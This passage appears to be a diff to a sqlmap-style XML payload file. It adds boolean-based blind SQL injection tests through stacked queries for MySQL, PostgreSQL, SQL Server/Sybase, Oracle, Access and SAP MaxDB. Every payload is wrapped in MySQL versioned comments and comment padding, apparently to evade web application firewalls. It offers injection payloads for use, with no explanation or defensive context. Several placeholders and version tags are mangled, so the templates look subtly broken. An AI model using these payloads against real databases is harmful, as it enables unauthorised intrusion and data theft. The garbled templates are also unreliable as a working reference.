+            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END)/**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
+    <test>
+        <title>PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000IF(/*!50000[INFERENCE]/**_**/*/)/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ /*!50000[/*!50000RANDSTR]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>;/*!50000IF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ /*!50000[/*!50000RANDSTR]/**_**/*//**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000IF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ /*!50000[/*!50000RANDSTR]/**_**/*//**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000IIF(/*!50000[INFERENCE]/**_**/*/,1,1/0)/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,1,1/0)/**_**/*/</payload>
+            <comment>%/*!5000016/**_**/*/</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,1,1/0)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+    <!-- End of boolean-based blind tests - Stacked queries -->
+</root>
